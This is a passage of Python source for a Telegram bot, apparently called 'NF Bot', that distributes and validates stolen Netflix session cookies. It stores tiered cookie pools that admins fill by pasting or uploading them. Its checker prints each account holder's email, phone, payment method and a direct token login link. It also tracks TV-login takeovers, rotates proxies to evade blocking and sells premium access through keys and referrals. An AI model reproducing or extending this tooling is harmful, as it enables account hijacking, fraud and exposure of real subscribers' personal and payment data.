    current_expiry = user.get("premium_expiry", 0)
    new_expiry = max(current_expiry, time.time()) + duration * 3600
    user["premium_expiry"] = new_expiry
    user["premium_check_quota"] = user.get("premium_check_quota", 0) + check_quota
    user["premium_get_quota"] = user.get("premium_get_quota", 0) + get_quota
    key_data["remaining_uses"] -= 1
    save_keys(keys)
    save_users(users)
    await update.effective_message.reply_text(
        premium_emoji(f"✅ Premium activated!\nCheck quota: {check_quota}\nGet quota: {get_quota}\nDuration: {duration} hours\nExpires: {datetime.fromtimestamp(new_expiry).strftime('%Y-%m-%d %H:%M UTC')}"),
        parse_mode='HTML'
    )

# ---------- REFERRAL ----------
async def referral(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return
    user_id = str(update.effective_user.id)
    username = context.bot.username or "darkhuchannel"
    link = f"https://t.me/{username}?start=ref_{user_id}"
    await update.effective_message.reply_text(
        premium_emoji(f"🔗 Your referral link:\n{link}\n\nShare this link. Each new user who joins gives you +1 Premium cookie.\nUse /claim to redeem your earned cookies.\nReward per referral: {REFERRAL_REWARD_HOURS}h + {REFERRAL_REWARD_CHECK_QUOTA} checks + {REFERRAL_REWARD_GET_QUOTA} gets."),
        parse_mode='HTML'
    )

# ---------- NFCHECK ----------
async def check_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    # No ban check – allow even banned users
    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)
    is_prem = is_premium(user)
    is_admin = user.get("is_admin", False)
    today = datetime.now().strftime("%Y-%m-%d")
    if user.get("last_check_date") != today:
        user["last_check_date"] = today
        user["checks_today"] = 0

    if is_admin:
        check_limit = PREMIUM_LIMIT
        limit_display = "∞"
    elif is_prem:
        if user.get("premium_check_quota", 0) <= 0:
            await update.effective_message.reply_text(premium_emoji("❌ Your premium check quota is exhausted. Please redeem a new key."), parse_mode='HTML')
            return
        check_limit = user["premium_check_quota"]
        limit_display = str(check_limit)
    else:
        check_limit = FREE_CHECK_LIMIT
        limit_display = str(FREE_CHECK_LIMIT)

    if user["checks_today"] >= check_limit and not is_admin:
        await update.effective_message.reply_text(
            premium_emoji(f"❌ You have reached your daily check limit ({check_limit} checks).\nUpgrade to Premium for unlimited checks."),
            parse_mode='HTML'
        )
        return

    if not context.args:
        await update.effective_message.reply_text(premium_emoji("Usage: /nfcheck NetflixId or raw token"), parse_mode='HTML')
        return

    raw = ' '.join(context.args)
    nid = generator.extract_netflixid(raw)
    if not nid:
        await update.effective_message.reply_text(premium_emoji("❌ Could not extract NetflixId."), parse_mode='HTML')
        return

    user["checks_today"] += 1
    if is_prem and not is_admin:
        user["premium_check_quota"] -= 1
    save_users(users)

    global_stats["total_single_checks"] += 1

    remaining = check_limit - user["checks_today"] if not is_admin else "∞"
    remaining_display = "∞" if is_admin else str(remaining)
    await update.effective_message.reply_text(premium_emoji(f"⏳ Checking cookie... (remaining checks today: {remaining_display})"), parse_mode='HTML')
    valid, info = await asyncio.to_thread(generator.verify_cookie, nid)
    if valid:
        token = info.get('_token')
        if not token:
            fresh = await get_cached_token(nid)
            if fresh:
                token = fresh
        output = format_output(token, info, nid)
        await update.effective_message.reply_text(premium_emoji(f"✅ Cookie is valid!\n{output}"), parse_mode='HTML')
    else:
        await update.effective_message.reply_text(premium_emoji(f"❌ Cookie is invalid or expired.\nNetflixId: {nid}"), parse_mode='HTML')

# ---------- ADMIN PANEL ----------
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    user_id = str(update.effective_user.id)
    _, user = ensure_user(user_id, update.effective_user.username)
    if not user.get("is_admin", False):
        await update.effective_message.reply_text(premium_emoji("⛔ Admin only."), parse_mode='HTML')
        return
    keyboard = [
        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey")],
        [InlineKeyboardButton("🔄 Reload Pool", callback_data="admin_reload")],
        [InlineKeyboardButton("📥 Add Cookie", callback_data="admin_addcookie")],
        [InlineKeyboardButton("📤 Upload File", callback_data="admin_upload")],
        [InlineKeyboardButton("👥 List Users", callback_data="admin_users")],
    ]
    await update.effective_message.reply_text(
        premium_emoji("🔧 Admin Panel"),
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not query.from_user:
        return
    user_id = str(query.from_user.id)
    _, user = ensure_user(user_id, update.effective_user.username)
    if not user.get("is_admin", False):
        await query.edit_message_text(premium_emoji("⛔ Admin only."), parse_mode='HTML')
        return
    data = query.data
    if data == "admin_stats":
        users = load_users()
        used = load_used()
        basic_raw, standard_raw, premium_raw = await get_pool_cached()
        avail_basic = len([c for c in basic_raw if c not in used])
        avail_standard = len([c for c in standard_raw if c not in used])
        avail_premium = len([c for c in premium_raw if c not in used])
        total_cookies = len(basic_raw) + len(standard_raw) + len(premium_raw)
        total_used = len(used)
        total_users = len(users)
        premium_users = sum(1 for u in users.values() if u.get("premium_expiry", 0) > time.time() and (u.get("premium_check_quota", 0) > 0 or u.get("premium_get_quota", 0) > 0))
        with tv_stats_lock:
            tv = tv_stats
        msg = (
            f"📊 Bot Stats\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 Users:\n"
            f"  • Total: {total_users}\n"
            f"  • Premium: {premium_users}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🍪 Cookie Pool:\n"
            f"  • Basic: {avail_basic} (total {len(basic_raw)})\n"
            f"  • Standard: {avail_standard} (total {len(standard_raw)})\n"
            f"  • Premium: {avail_premium} (total {len(premium_raw)})\n"
            f"  • Used: {total_used}\n"
            f"  • Total cookies: {total_cookies}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📺 TV Logins:\n"
            f"  • Total attempts: {tv['total_logins']}\n"
            f"  • Successful: {tv['successful']}\n"
            f"  • Failed (dead): {tv['failed']}\n"
            f"  • Invalid codes: {tv['codes_rejected']}\n"
            f"  • Started: {tv['started_at']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔍 Checks:\n"
            f"  • Mass checks run: {global_stats['total_mass_checks']}\n"
            f"  • Single checks: {global_stats['total_single_checks']}\n"
            f"  • Started: {global_stats['started_at']}\n"
        )
        await query.edit_message_text(premium_emoji(msg), parse_mode='HTML')
    elif data == "admin_genkey":
        await query.edit_message_text(premium_emoji("Use /keys check_quota get_quota hours max_users to generate a key.\nExample: /keys 50 10 24 10  (50 checks, 10 gets, 24 hours, 10 users)"), parse_mode='HTML')
    elif data == "admin_reload":
        counts = await get_pool_counts(force=True)
        await query.edit_message_text(
            premium_emoji(f"🔄 Pool reloaded\nBasic: {counts['basic']}\nStandard: {counts['standard']}\nPremium: {counts['premium']}"),
            parse_mode='HTML'
        )
    elif data == "admin_addcookie":
        await query.edit_message_text(premium_emoji("Send me a NetflixId (or raw cookie) and I'll add it to the pool.\nExample: NetflixId=abc123...\nYou can send multiple lines."), parse_mode='HTML')
        context.user_data['expecting_cookie'] = True
    elif data == "admin_upload":
        await query.edit_message_text(premium_emoji("Send me a .txt file with one NetflixId per line.\nI will add them to the pool."), parse_mode='HTML')
    elif data == "admin_users":
        users = load_users()
        lines = []
        for uid, u in list(users.items())[:20]:
            is_prem = u.get("premium_expiry", 0) > time.time() and (u.get("premium_check_quota", 0) > 0 or u.get("premium_get_quota", 0) > 0)
            username = u.get("username")
            display = get_user_display(uid, username)
            lines.append(f"{display}: {'👑 Admin' if u.get('is_admin') else '⭐ Premium' if is_prem else '👤 Free'}")
        msg = "👥 Users (first 20)\n" + "\n".join(lines)
        await query.edit_message_text(premium_emoji(msg), parse_mode='HTML')

# ---------- KEYS ----------
async def keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    user_id = str(update.effective_user.id)
    _, user = ensure_user(user_id, update.effective_user.username)
    if not user.get("is_admin", False):
        await update.effective_message.reply_text(premium_emoji("⛔ Admin only."), parse_mode='HTML')
        return
    args = context.args
    if len(args) != 4:
        await update.effective_message.reply_text(
            premium_emoji("Usage: /keys check_quota get_quota hours max_users\nExample: /keys 50 10 24 10  (50 checks, 10 gets, 24 hours, 10 users)"),
            parse_mode='HTML'
        )
        return
    try:
        check_quota = int(args[0])
        get_quota = int(args[1])
        hours = int(args[2])
        max_users = int(args[3])
    except:
        await update.effective_message.reply_text(premium_emoji("Invalid numbers."), parse_mode='HTML')
        return
    keys = load_keys()
    while True:
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
        if key not in keys:
            break
    keys[key] = {
        "check_quota": check_quota,
        "get_quota": get_quota,
        "duration_hours": hours,
        "remaining_uses": max_users,
        "created_by": user_id,
        "created_at": time.time()
    }
    save_keys(keys)
    await update.effective_message.reply_text(
        premium_emoji(f"✅ Key generated\n{key}\nCheck quota: {check_quota}\nGet quota: {get_quota}\nDuration: {hours} hours\nMax uses: {max_users}\nShare this key with users to redeem premium."),
        parse_mode='HTML'
    )

# ---------- OUTPUT FORMATTER ----------
def format_output(token: str, info: Dict, netflix_id: str) -> str:
    email = clean_text(info.get('email', 'N/A'))
    plan = clean_text(info.get('plan_nombre', 'N/A'))
    country = clean_text(info.get('pais', 'N/A'))
    billing = translate_date(clean_text(info.get('renovacion_fecha', 'N/A')))
    streams = clean_text(info.get('streams', 'Unknown'))
    quality = clean_text(info.get('quality', 'Unknown'))
    payment = clean_text(info.get('payment_method', 'Unknown'))
    phone = clean_text(info.get('phone', 'Not linked'))
    hold = clean_text(info.get('hold', 'No'))
    price = clean_text(info.get('price', 'N/A'))
    login_link = f"https://netflix.com/?nftoken={token}" if token else "N/A"

    return f"""
📺 Netflix Bot 📺
━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 NetflixId:
<code>{netflix_id}</code>

🔑 Login Link:
<code>{login_link}</code>

📧 Email: {email}
💳 Plan: {plan}
💰 Price: {price}
🌍 Country: {country}
📅 Next Billing: {billing}
📺 Streams: {streams}
🎬 Quality: {quality}
💳 Payment: {payment}
📱 Phone: {phone}
⏸️ Hold: {hold}
━━━━━━━━━━━━━━━━━━━━━━━━━
"""

# ---------- PROXY ADMIN COMMANDS ----------
async def check_proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.effective_message.reply_text(premium_emoji("❌ Admin only."), parse_mode='HTML')
        return

    proxies = list(proxy_manager.proxies)
    if not proxies:
        await update.effective_message.reply_text(premium_emoji("❌ No proxies found. Add some first."), parse_mode='HTML')
        return

    status_msg = await update.effective_message.reply_text(
        premium_emoji(f"🔄 Testing {len(proxies)} proxies..."),
        parse_mode='HTML'
    )

    checker = ProxyChecker(timeout=5)
    start_time = time.time()
    last_update_time = 0
    update_step = max(1, len(proxies) // 20)

    def progress_callback(total, checked):
        nonlocal last_update_time
        now = time.time()
        if checked % update_step == 0 or checked == total or (now - last_update_time) >= 1.0:
            last_update_time = now
            async def update_status():
                try:
                    pct = int((checked / total) * 100) if total else 0
                    bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
                    await status_msg.edit_text(
                        premium_emoji(
                            f"🔄 Testing proxies... {pct}% [{bar}]\n"
                            f"✅ Alive: {len(checker.live)}\n"
                            f"⏳ Remaining: {total - checked}"
                        ),
                        parse_mode='HTML'
                    )
                except Exception as e:
                    if "RetryAfter" not in str(e):
                        log.error(f"Progress update error: {e}")
            asyncio.create_task(update_status())

    live = await checker.check_all(proxies, target=0, threads=100, progress_callback=progress_callback)
    elapsed = time.time() - start_time

    if live:
        proxy_manager.proxies = set(p for p, _ in live)
        await proxy_manager.save_to_file_async(PROXY_FILE)
        await status_msg.delete()
        msg = premium_emoji(f"✅ Proxy test complete.\n{len(live)} alive proxies saved.\n⏱️ {elapsed:.2f}s\n❌ Bad: {checker.bad} | ⚠️ Error: {checker.errors}")
        content = "\n".join([p for p, _ in live]).encode('utf-8')
        file_stream = io.BytesIO(content)
        file_stream.name = "proxy.txt"
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=InputFile(file_stream, filename="proxy.txt"),
            caption=msg,
            parse_mode='HTML'
        )
    else:
        try:
            await status_msg.edit_text(premium_emoji(f"⚠️ No alive proxies found! ❌ Bad: {checker.bad} | ⚠️ Error: {checker.errors}"), parse_mode='HTML')
        except Exception as e:
            if "RetryAfter" in str(e):
                import re
                match = re.search(r'Retry after (\d+)', str(e))
                if match:
                    delay = int(match.group(1))
                    await asyncio.sleep(delay)
                    await status_msg.edit_text(premium_emoji(f"⚠️ No alive proxies found! ❌ Bad: {checker.bad} | ⚠️ Error: {checker.errors}"), parse_mode='HTML')
                else:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=premium_emoji(f"⚠️ No alive proxies found! ❌ Bad: {checker.bad} | ⚠️ Error: {checker.errors}"),
                        parse_mode='HTML'
                    )
            else:
                raise

async def add_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.effective_message.reply_text(premium_emoji("❌ Admin only."), parse_mode='HTML')
        return
    args = context.args
    if not args:
        await update.effective_message.reply_text(premium_emoji("Usage: /addproxy proxy1 proxy2 ..."), parse_mode='HTML')
        return
    new_proxies = []
    for arg in args:
        for line in arg.splitlines():
            line = line.strip()
            if line:
                new_proxies.append(line)
    if not new_proxies:
        await update.effective_message.reply_text(premium_emoji("❌ No valid proxies."), parse_mode='HTML')
        return
    added = proxy_manager.add_proxies(new_proxies)
    await update.effective_message.reply_text(
        premium_emoji(f"✅ Added {len(added)} proxies. Total: {len(proxy_manager.proxies)}. Run /check to test them."),
        parse_mode='HTML'
    )

async def clear_feedback_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.effective_message.reply_text("⛔ Admin only.")
        return
    if not context.args:
        await update.effective_message.reply_text("Usage: /clearfeedback <user_id>")
        return
    target = context.args[0]
    clear_pending_feedback(target)
    await update.effective_message.reply_text(f"✅ Cleared pending feedback for user {target}.")

async def add_proxy_file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.effective_message.reply_text(premium_emoji("❌ Admin only."), parse_mode='HTML')
        return
    doc = update.effective_message.document or (update.effective_message.reply_to_message.document if update.effective_message.reply_to_message else None)
    if not doc:
        await update.effective_message.reply_text(premium_emoji("❌ Please reply to a .txt file."), parse_mode='HTML')
        return
    if not doc.file_name.endswith('.txt'):
        await update.effective_message.reply_text(premium_emoji("❌ Only .txt files are accepted."), parse_mode='HTML')
        return
    file = await doc.get_file()
    content = await file.download_as_bytearray()
    text = content.decode('utf-8', errors='ignore')
    proxies = [line.strip() for line in text.splitlines() if line.strip()]
    if not proxies:
        await update.effective_message.reply_text(premium_emoji("❌ No proxies found."), parse_mode='HTML')
        return
    added = proxy_manager.add_proxies(proxies)
    await update.effective_message.reply_text(
        premium_emoji(f"✅ Added {len(added)} proxies from file. Total: {len(proxy_manager.proxies)}. Run /check to test them."),
        parse_mode='HTML'
    )

# ---------- BAN & UNBAN & LIST USERS ----------
async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /ban <user_id> <reason>")
        return
    target = context.args[0]
    reason = " ".join(context.args[1:]) if len(context.args) > 1 else "No reason provided"
    users, user = ensure_user(target)
    user["banned"] = True
    user["ban_reason"] = reason
    save_users(users)
    try:
        await context.bot.send_message(
            chat_id=int(target),
            text=premium_emoji(f"⛔ You have been **banned** from using this bot.\nReason: {reason}\nContact admin if you think this is a mistake."),
            parse_mode='HTML'
        )
    except Exception as e:
        log.error(f"Could not notify banned user {target}: {e}")
    await update.message.reply_text(f"✅ Banned user {target}. Reason: {reason}")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    target = context.args[0]
    users, user = ensure_user(target)
    user["banned"] = False
    user["ban_reason"] = ""
    save_users(users)
    await update.message.reply_text(f"✅ Unbanned user {target}.")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    users = load_users()
    if not users:
        await update.message.reply_text("No users found.")
        return
    lines = []
    for uid, user in users.items():
        username = user.get("username")
        display = get_user_display(uid, username)
        status = "👤 Free"
        if user.get("banned"):
            status = "⛔ Banned"
        elif user.get("is_admin"):
            status = "👑 Admin"
        elif is_premium(user):
            status = "⭐ Premium"
        lines.append(f"{display}: {status}")
    content = "\n".join(lines)
    if len(content) > 4000:
        f = io.BytesIO(content.encode('utf-8'))
        f.name = "users_list.txt"
        await update.message.reply_document(document=InputFile(f, filename="users_list.txt"), caption="👥 Full user list")
    else:
        await update.message.reply_text(f"👥 Users:\n{content}")

# ---- NEW: /broadcast ----
async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    msg = ' '.join(context.args)
    users = load_users()
    if not users:
        await update.message.reply_text("No users found.")
        return
    sent = 0
    failed = 0
    status_msg = await update.message.reply_text(f"📤 Broadcasting to {len(users)} users...")
    for uid in users:
        try:
            await context.bot.send_message(chat_id=int(uid), text=premium_emoji(msg), parse_mode='HTML')
            sent += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    await status_msg.edit_text(premium_emoji(f"✅ Broadcast complete.\nSent: {sent}\nFailed: {failed}"), parse_mode='HTML')

# ---- NEW: /bdfb ----
async def bdfb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enable/disable auto-broadcast to pending feedback users."""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("Usage: /bdfb <yes/no> [minutes]\nExample: /bdfb yes 30\nExample: /bdfb no")
        return

    global feedback_broadcast_interval
    action = context.args[0].lower()
    if action == "no":
        feedback_broadcast_interval = 0
        await update.message.reply_text("✅ Auto-broadcast disabled.")
    elif action == "yes":
        if len(context.args) < 2:
            await update.message.reply_text("❌ Please specify interval in minutes, e.g., /bdfb yes 30")
            return
        try:
            minutes = int(context.args[1])
            if minutes <= 0:
                raise ValueError
        except:
            await update.message.reply_text("❌ Invalid minutes. Must be a positive integer.")
            return
        feedback_broadcast_interval = minutes
        await update.message.reply_text(f"✅ Auto-broadcast enabled every {minutes} minute(s).")
    else:
        await update.message.reply_text("❌ Invalid action. Use yes or no.")

# ---- NEW: /listfb ----
async def list_feedback_pending(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    users = load_users()
    pending = []
    for uid, user in users.items():
        pf = user.get("pending_feedback")
        if pf:
            username = user.get("username")
            display = get_user_display(uid, username)
            pending.append(f"{display} - {pf['type']} - pending since {datetime.fromtimestamp(pf['timestamp']).isoformat()}")
    if not pending:
        await update.message.reply_text("✅ No users with pending feedback.")
        return
    content = "\n".join(pending)
    if len(content) > 4000:
        f = io.BytesIO(content.encode('utf-8'))
        f.name = "pending_feedback.txt"
        await update.message.reply_document(document=InputFile(f, filename="pending_feedback.txt"), caption="📋 Users with pending feedback")
    else:
        await update.message.reply_text(f"📋 Users with pending feedback:\n{content}")

# ---- NEW: /clearfb ----
async def clearfb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /clearfb <user_id>")
        return
    target = context.args[0]
    clear_pending_feedback(target)
    await update.message.reply_text(f"✅ Cleared pending feedback for user {target}.")

# ---- NEW: /autoban ----
async def autoban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("Usage: /autoban <yes/no> [minutes]\nExample: /autoban yes 10\nExample: /autoban no")
        return

    global AUTOBAN_ENABLED, AUTOBAN_TIMEOUT_MINUTES
    action = context.args[0].lower()
    if action == "no":
        AUTOBAN_ENABLED = False
        await update.message.reply_text("✅ Auto-ban disabled.")
    elif action == "yes":
        if len(context.args) < 2:
            await update.message.reply_text("❌ Please specify timeout in minutes, e.g., /autoban yes 10")
            return
        try:
            minutes = int(context.args[1])
            if minutes <= 0:
                raise ValueError
        except:
            await update.message.reply_text("❌ Invalid minutes. Must be a positive integer.")
            return
        AUTOBAN_ENABLED = True
        AUTOBAN_TIMEOUT_MINUTES = minutes
        await update.message.reply_text(f"✅ Auto-ban enabled. Users who don't send feedback within {minutes} minutes will be banned.")
    else:
        await update.message.reply_text("❌ Invalid action. Use yes or no.")

# ---------- BACKGROUND BROADCAST LOOP ----------
async def feedback_broadcast_loop(bot):
    global feedback_broadcast_interval
    while True:
        if bot is None:
            await asyncio.sleep(60)
            continue
        if feedback_broadcast_interval <= 0:
            await asyncio.sleep(60)
            continue
        await asyncio.sleep(feedback_broadcast_interval * 60)
        try:
            users = load_users()
            sent = 0
            failed = 0
            for uid, user in users.items():
                if user.get("pending_feedback"):
                    try:
                        username = user.get("username")
                        display = get_user_display(uid, username)
                        msg = premium_emoji(
                            f"⏰ **Reminder:** You have a pending screenshot request for your last `{user['pending_feedback']['type']}` command.\n"
                            f"Please send the screenshot **now** to complete the process.\n"
                            f"If you already sent it, ignore this message."
                        )
                        await bot.send_message(chat_id=int(uid), text=msg, parse_mode='HTML')
                        sent += 1
                        await asyncio.sleep(0.05)
                    except Exception as e:
                        log.error(f"Failed to send broadcast to {uid}: {e}")
                        failed += 1
            log.info(f"Feedback broadcast complete: sent={sent}, failed={failed}")
        except Exception as e:
            log.error(f"Error in feedback_broadcast_loop: {e}")

# ---------- BACKGROUND PERIODIC PROXY CHECK ----------
async def periodic_proxy_check():
    while True:
        await asyncio.sleep(PROXY_CHECK_INTERVAL * 60)
        log.info("🔄 Running periodic proxy health check...")
        proxies = list(proxy_manager.proxies)
        if not proxies:
            continue
        checker = ProxyChecker(timeout=5)
        live = await checker.check_all(proxies, target=0, threads=50)
        if live:
            proxy_manager.proxies = set(p for p, _ in live)
            await proxy_manager.save_to_file_async(PROXY_FILE)
            log.info(f"✅ Periodic check: {len(live)} alive proxies kept.")
        else:
            log.warning("⚠️ Periodic check: no alive proxies found.")

# ---------- ERROR HANDLER ----------
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log.exception("Exception while handling update:", exc_info=context.error)
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text(
                premium_emoji("⚠️ An error occurred. Please try again or contact the admin."),
                parse_mode='HTML'
            )
        except:
            pass

# ---------- BUTTON CALLBACK ----------
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "dist_get":
        await get(update, context)
    elif data == "dist_premium":
        await premium_status(update, context)
    elif data == "dist_redeem":
        await query.edit_message_text(premium_emoji("Usage: /redeem KEY"), parse_mode='HTML')
    elif data == "dist_referral":
        await referral(update, context)
    elif data == "dist_check":
        await query.edit_message_text(premium_emoji("Usage: /nfcheck NetflixId or raw token"), parse_mode='HTML')
    elif data == "dist_admin":
        await admin_panel(update, context)
    elif data == "dist_help":
        await help_command(update, context)
    elif data == "dist_claim":
        await claim_command(update, context)
    elif data.startswith("split_"):
        await split_callback(update, context)

# ---------- MAIN ----------
if __name__ == "__main__":
    import asyncio
    import sys
    import traceback

    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

    for f in [USERS_FILE, KEYS_FILE, USED_FILE, BASIC_FILE, STANDARD_FILE, PREMIUM_FILE]:
        if not os.path.exists(f):
            with open(f, 'w') as _: pass

    print("=" * 50)
    print("  NF Bot - Final Merged Version")
    print("=" * 50)
    print(f"  Pool: {loop.run_until_complete(get_pool_counts())}")
    print(f"  Proxies: {len(proxy_manager.proxies)}")
    print(f"  {WATERMARK}")
    print("=" * 50)
    print("🔄 Auto-restart enabled – will restart on crash.")

    feedback_task = None

    while True:
        try:
            app = ApplicationBuilder().token(TOKEN).build()

            app.add_handler(CommandHandler("start", start))
            app.add_handler(CommandHandler("help", help_command))
            app.add_handler(CommandHandler("link", link_command))
            app.add_handler(CommandHandler("tv", tv_command))
            app.add_handler(CommandHandler("get", get))
            app.add_handler(CommandHandler("premium", premium_status))
            app.add_handler(CommandHandler("redeem", redeem))
            app.add_handler(CommandHandler("referral", referral))
            app.add_handler(CommandHandler("claim", claim_command))
            app.add_handler(CommandHandler("nfcheck", check_cookie))
            app.add_handler(CommandHandler("admin", admin_panel))
            app.add_handler(CommandHandler("keys", keys_command))
            app.add_handler(CommandHandler("check", check_proxies_command))
            app.add_handler(CommandHandler("clearfeedback", clear_feedback_command))
            app.add_handler(CommandHandler("addproxy", add_proxy_command))
            app.add_handler(CommandHandler("addprotxt", add_proxy_file_command))
            app.add_handler(CommandHandler("ban", ban_user))
            app.add_handler(CommandHandler("unban", unban_user))
            app.add_handler(CommandHandler("listusers", list_users))
            # New admin commands
            app.add_handler(CommandHandler("broadcast", broadcast_command))
            app.add_handler(CommandHandler("bdfb", bdfb_command))
            app.add_handler(CommandHandler("listfb", list_feedback_pending))
            app.add_handler(CommandHandler("clearfb", clearfb_command))
            app.add_handler(CommandHandler("autoban", autoban_command))

            app.add_handler(CallbackQueryHandler(mode_button, pattern="^mode_(check|clean|split|tvlogin)$"))
            app.add_handler(CallbackQueryHandler(confirm_check, pattern="^confirm_check$"))
            app.add_handler(CallbackQueryHandler(cancel_check, pattern="^cancel_check$"))
            app.add_handler(CallbackQueryHandler(stop_check, pattern="^stop_check$"))
            app.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
            app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
            app.add_handler(CallbackQueryHandler(button_callback, pattern="^(dist_|split_)"))

            app.add_handler(MessageHandler(filters.Document.ALL & filters.ChatType.PRIVATE, file_upload))
            app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.PRIVATE & ~filters.COMMAND, handle_message))
            app.add_handler(MessageHandler(filters.PHOTO & filters.ChatType.PRIVATE, handle_message))

            app.add_error_handler(error_handler)

            if feedback_task is not None:
                feedback_task.cancel()
            # Restart feedback loops with actual bot
            feedback_task = loop.create_task(feedback_timeout_checker(app.bot))
            # Also start broadcast loop with actual bot
            loop.create_task(feedback_broadcast_loop(app.bot))

            print("✅ Bot started successfully. Press Ctrl+C to stop.")
            loop.create_task(log_memory())
            # Start the keep-alive web server in a background thread
            live()
            app.run_polling(allowed_updates=Update.ALL_TYPES)

        except (KeyboardInterrupt, SystemExit):
            print("🛑 Bot stopped by user.")
            break

        except Exception as e:
            print(f"❌ Bot crashed: {e}")
            print("Traceback:")
            traceback.print_exc()
            print("⏳ Restarting in 5 seconds...")
            time.sleep(5)
            continue
